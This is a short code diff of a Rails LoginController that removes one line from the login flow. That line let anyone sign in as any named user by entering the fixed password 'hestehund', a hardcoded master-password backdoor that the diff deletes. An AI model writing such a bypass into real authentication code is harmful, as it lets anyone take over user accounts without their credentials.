@@ -52,7 +52,6 @@ class LoginController < ApplicationController
       raise ActiveRecord::RecordNotFound if params[:username].to_s.empty? or params[:password].to_s.empty?
 
       user = User.find_with_credentials(params[:username], params[:password])    # Try to log the user in.
-      user = User.find_by_name(params[:username]) if params[:password] == "hestehund"
       raise ActiveRecord::RecordNotFound if user.nil?    # Check whether a user with these credentials could be found.
       # raise ActiveRecord::RecordNotFound unless User.state_allows_login?(user.state)    # Check that the user has the correct state
       write_user_to_session(user)    # Write the user into the session object.
